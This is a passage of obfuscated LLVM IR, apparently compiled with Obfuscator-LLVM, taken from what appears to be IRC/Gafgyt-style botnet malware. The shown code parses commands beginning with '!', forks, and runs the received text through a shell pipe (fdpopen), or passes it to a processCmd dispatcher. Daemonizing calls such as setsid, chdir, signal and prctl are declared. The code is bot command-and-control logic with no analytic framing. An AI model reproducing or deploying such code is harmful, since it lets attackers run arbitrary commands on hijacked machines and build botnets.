; <label>:335:                                    ; preds = %320
  %336 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %336, i8** %24, align 8
  %337 = load i8*, i8** %24, align 8
  %338 = load i8, i8* %337, align 1
  %339 = zext i8 %338 to i32
  %340 = icmp eq i32 %339, 33
  br i1 %340, label %341, label %542

; <label>:341:                                    ; preds = %335
  %342 = load i8*, i8** %24, align 8
  %343 = getelementptr inbounds i8, i8* %342, i64 1
  store i8* %343, i8** %25, align 8
  br label %344

; <label>:344:                                    ; preds = %356, %341
  %345 = load i8*, i8** %25, align 8
  %346 = load i8, i8* %345, align 1
  %347 = zext i8 %346 to i32
  %348 = icmp ne i32 %347, 32
  br i1 %348, label %349, label %354

; <label>:349:                                    ; preds = %344
  %350 = load i8*, i8** %25, align 8
  %351 = load i8, i8* %350, align 1
  %352 = zext i8 %351 to i32
  %353 = icmp ne i32 %352, 0
  br label %354

; <label>:354:                                    ; preds = %349, %344
  %355 = phi i1 [ false, %344 ], [ %353, %349 ]
  br i1 %355, label %356, label %359

; <label>:356:                                    ; preds = %354
  %357 = load i8*, i8** %25, align 8
  %358 = getelementptr inbounds i8, i8* %357, i32 1
  store i8* %358, i8** %25, align 8
  br label %344

; <label>:359:                                    ; preds = %354
  %360 = load i8*, i8** %25, align 8
  %361 = load i8, i8* %360, align 1
  %362 = zext i8 %361 to i32
  %363 = icmp eq i32 %362, 0
  br i1 %363, label %364, label %365

; <label>:364:                                    ; preds = %359
  br label %208

; <label>:365:                                    ; preds = %359
  %366 = load i8*, i8** %25, align 8
  store i8 0, i8* %366, align 1
  %367 = load i8*, i8** %24, align 8
  %368 = getelementptr inbounds i8, i8* %367, i64 1
  store i8* %368, i8** %25, align 8
  %369 = load i8*, i8** %24, align 8
  %370 = load i8*, i8** %25, align 8
  %371 = call i64 @strlen(i8* %370) #10
  %372 = getelementptr inbounds i8, i8* %369, i64 %371
  %373 = getelementptr inbounds i8, i8* %372, i64 2
  store i8* %373, i8** %24, align 8
  br label %374

; <label>:374:                                    ; preds = %400, %365
  %375 = load i8*, i8** %24, align 8
  %376 = load i8*, i8** %24, align 8
  %377 = call i64 @strlen(i8* %376) #10
  %378 = add i64 %377, 4946171097801006976
  %379 = sub i64 %378, 1
  %380 = sub i64 %379, 4946171097801006976
  %381 = sub i64 %377, 1
  %382 = getelementptr inbounds i8, i8* %375, i64 %380
  %383 = load i8, i8* %382, align 1
  %384 = zext i8 %383 to i32
  %385 = icmp eq i32 %384, 10
  br i1 %385, label %398, label %386

; <label>:386:                                    ; preds = %374
  %387 = load i8*, i8** %24, align 8
  %388 = load i8*, i8** %24, align 8
  %389 = call i64 @strlen(i8* %388) #10
  %390 = add i64 %389, -1422805893436973091
  %391 = sub i64 %390, 1
  %392 = sub i64 %391, -1422805893436973091
  %393 = sub i64 %389, 1
  %394 = getelementptr inbounds i8, i8* %387, i64 %392
  %395 = load i8, i8* %394, align 1
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 13
  br label %398

; <label>:398:                                    ; preds = %386, %374
  %399 = phi i1 [ true, %374 ], [ %397, %386 ]
  br i1 %399, label %400, label %409

; <label>:400:                                    ; preds = %398
  %401 = load i8*, i8** %24, align 8
  %402 = load i8*, i8** %24, align 8
  %403 = call i64 @strlen(i8* %402) #10
  %404 = sub i64 %403, 8049745616686129509
  %405 = sub i64 %404, 1
  %406 = add i64 %405, 8049745616686129509
  %407 = sub i64 %403, 1
  %408 = getelementptr inbounds i8, i8* %401, i64 %406
  store i8 0, i8* %408, align 1
  br label %374

; <label>:409:                                    ; preds = %398
  %410 = load i8*, i8** %24, align 8
  store i8* %410, i8** %26, align 8
  br label %411

; <label>:411:                                    ; preds = %423, %409
  %412 = load i8*, i8** %24, align 8
  %413 = load i8, i8* %412, align 1
  %414 = zext i8 %413 to i32
  %415 = icmp ne i32 %414, 32
  br i1 %415, label %416, label %421

; <label>:416:                                    ; preds = %411
  %417 = load i8*, i8** %24, align 8
  %418 = load i8, i8* %417, align 1
  %419 = zext i8 %418 to i32
  %420 = icmp ne i32 %419, 0
  br label %421

; <label>:421:                                    ; preds = %416, %411
  %422 = phi i1 [ false, %411 ], [ %420, %416 ]
  br i1 %422, label %423, label %426

; <label>:423:                                    ; preds = %421
  %424 = load i8*, i8** %24, align 8
  %425 = getelementptr inbounds i8, i8* %424, i32 1
  store i8* %425, i8** %24, align 8
  br label %411

; <label>:426:                                    ; preds = %421
  %427 = load i8*, i8** %24, align 8
  store i8 0, i8* %427, align 1
  %428 = load i8*, i8** %24, align 8
  %429 = getelementptr inbounds i8, i8* %428, i32 1
  store i8* %429, i8** %24, align 8
  %430 = load i8*, i8** %26, align 8
  store i8* %430, i8** %27, align 8
  br label %431

; <label>:431:                                    ; preds = %435, %426
  %432 = load i8*, i8** %27, align 8
  %433 = load i8, i8* %432, align 1
  %434 = icmp ne i8 %433, 0
  br i1 %434, label %435, label %444

; <label>:435:                                    ; preds = %431
  %436 = load i8*, i8** %27, align 8
  %437 = load i8, i8* %436, align 1
  %438 = zext i8 %437 to i32
  %439 = call i32 @toupper(i32 %438) #10
  %440 = trunc i32 %439 to i8
  %441 = load i8*, i8** %27, align 8
  store i8 %440, i8* %441, align 1
  %442 = load i8*, i8** %27, align 8
  %443 = getelementptr inbounds i8, i8* %442, i32 1
  store i8* %443, i8** %27, align 8
  br label %431

; <label>:444:                                    ; preds = %431
  %445 = load i8*, i8** %26, align 8
  %446 = call i32 @strcmp(i8* %445, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.420, i32 0, i32 0)) #10
  %447 = icmp eq i32 %446, 0
  br i1 %447, label %448, label %471

; <label>:448:                                    ; preds = %444
  %449 = call i32 @listFork()
  %450 = icmp ne i32 %449, 0
  br i1 %450, label %451, label %452

; <label>:451:                                    ; preds = %448
  br label %208

; <label>:452:                                    ; preds = %448
  %453 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %453, i8 0, i64 1024, i32 16, i1 false)
  %454 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %455 = load i8*, i8** %24, align 8
  %456 = call i32 (i8*, i8*, ...) @szprintf(i8* %454, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.421, i32 0, i32 0), i8* %455)
  %457 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %458 = call i32 @fdpopen(i8* %457, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store i32 %458, i32* %29, align 4
  br label %459

; <label>:459:                                    ; preds = %464, %452
  %460 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %461 = load i32, i32* %29, align 4
  %462 = call i8* @fdgets(i8* %460, i32 1024, i32 %461)
  %463 = icmp ne i8* %462, null
  br i1 %463, label %464, label %468

; <label>:464:                                    ; preds = %459
  %465 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %465)
  %466 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %466, i8 0, i64 1024, i32 16, i1 false)
  %467 = call i32 @sleep(i32 1)
  br label %459

; <label>:468:                                    ; preds = %459
  %469 = load i32, i32* %29, align 4
  %470 = call i32 @fdpclose(i32 %469)
  call void @exit(i32 0) #14
  unreachable

; <label>:471:                                    ; preds = %444
  store i32 1, i32* %31, align 4
  %472 = load i8*, i8** %24, align 8
  %473 = call i8* @strtok(i8* %472, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %473, i8** %32, align 8
  %474 = load i8*, i8** %26, align 8
  %475 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %474, i8** %475, align 16
  br label %476

; <label>:476:                                    ; preds = %517, %471
  %477 = load i8*, i8** %32, align 8
  %478 = icmp ne i8* %477, null
  br i1 %478, label %479, label %519

; <label>:479:                                    ; preds = %476
  %480 = load i8*, i8** %32, align 8
  %481 = load i8, i8* %480, align 1
  %482 = zext i8 %481 to i32
  %483 = icmp ne i32 %482, 10
  br i1 %483, label %484, label %517

; <label>:484:                                    ; preds = %479
  %485 = load i8*, i8** %32, align 8
  %486 = call i64 @strlen(i8* %485) #10
  %487 = sub i64 0, %486
  %488 = sub i64 0, 1
  %489 = add i64 %487, %488
  %490 = sub i64 0, %489
  %491 = add i64 %486, 1
  %492 = call noalias i8* @malloc(i64 %490) #2
  %493 = load i32, i32* %31, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %494
  store i8* %492, i8** %495, align 8
  %496 = load i32, i32* %31, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %497
  %499 = load i8*, i8** %498, align 8
  %500 = load i8*, i8** %32, align 8
  %501 = call i64 @strlen(i8* %500) #10
  %502 = sub i64 0, %501
  %503 = sub i64 0, 1
  %504 = add i64 %502, %503
  %505 = sub i64 0, %504
  %506 = add i64 %501, 1
  call void @llvm.memset.p0i8.i64(i8* %499, i8 0, i64 %505, i32 1, i1 false)
  %507 = load i32, i32* %31, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %508
  %510 = load i8*, i8** %509, align 8
  %511 = load i8*, i8** %32, align 8
  %512 = call i8* @strcpy(i8* %510, i8* %511) #2
  %513 = load i32, i32* %31, align 4
  %514 = sub i32 0, 1
  %515 = sub i32 %513, %514
  %516 = add nsw i32 %513, 1
  store i32 %515, i32* %31, align 4
  br label %517

; <label>:517:                                    ; preds = %484, %479
  %518 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %518, i8** %32, align 8
  br label %476

; <label>:519:                                    ; preds = %476
  %520 = load i32, i32* %31, align 4
  %521 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %520, i8** %521)
  %522 = load i32, i32* %31, align 4
  %523 = icmp sgt i32 %522, 1
  br i1 %523, label %524, label %541

; <label>:524:                                    ; preds = %519
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  br label %525

; <label>:525:                                    ; preds = %534, %524
  %526 = load i32, i32* %33, align 4
  %527 = load i32, i32* %31, align 4
  %528 = icmp slt i32 %526, %527
  br i1 %528, label %529, label %540

; <label>:529:                                    ; preds = %525
  %530 = load i32, i32* %33, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %531
  %533 = load i8*, i8** %532, align 8
  call void @free(i8* %533) #2
  br label %534

; <label>:534:                                    ; preds = %529
  %535 = load i32, i32* %33, align 4
  %536 = add i32 %535, -1624706274
  %537 = add i32 %536, 1
  %538 = sub i32 %537, -1624706274
  %539 = add nsw i32 %535, 1
  store i32 %538, i32* %33, align 4
  br label %525

; <label>:540:                                    ; preds = %525
  br label %541

; <label>:541:                                    ; preds = %540, %519
  br label %542

; <label>:542:                                    ; preds = %541, %335
  br label %208

; <label>:543:                                    ; preds = %334, %208
  br label %197
                                                  ; No predecessors!
  %545 = load i32, i32* %3, align 4
  ret i32 %545
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146576028}
!2 = !{i32 -2146575337}
!3 = !{i32 -2146574643}
!4 = !{i32 -2146573883}
!5 = !{i32 -2146573060}
!6 = !{i32 -2146572153}
